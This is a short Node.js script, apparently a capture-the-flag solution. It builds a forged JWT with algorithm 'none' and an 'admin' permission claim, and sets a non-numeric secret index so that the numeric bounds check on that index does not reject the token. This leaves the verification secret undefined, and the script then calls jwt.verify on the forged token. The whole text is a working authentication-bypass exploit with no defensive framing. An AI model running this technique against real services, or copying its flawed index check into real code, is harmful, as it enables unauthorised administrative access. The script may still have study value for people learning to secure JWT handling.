const jwt = require('jsonwebtoken');
const b64 = require('base-64');

const enc = (str) => {
  let s = b64.encode(str);
  return s.replace(/=/g, "");
};


const header = "{ \"alg\": \"none\", \"typ\": \"JWT\" }"
const payload = "{ \"perms\": \"admin\", \"secretid\": \"loooooool\", \"rolled\": \"no\" }"

const token = `${enc(header)}.${enc(payload)}.`
console.log(token);

let secrets = [];
let sid = JSON.parse(Buffer.from(token.split(".")[1], 'base64').toString()).secretid;
console.log(sid);
console.log(secrets[sid]);
if (sid==undefined || sid>=secrets.length || sid<0) {
  throw "invalid sid";
}
let decoded = jwt.verify(token, secrets[sid]);
console.log(decoded);
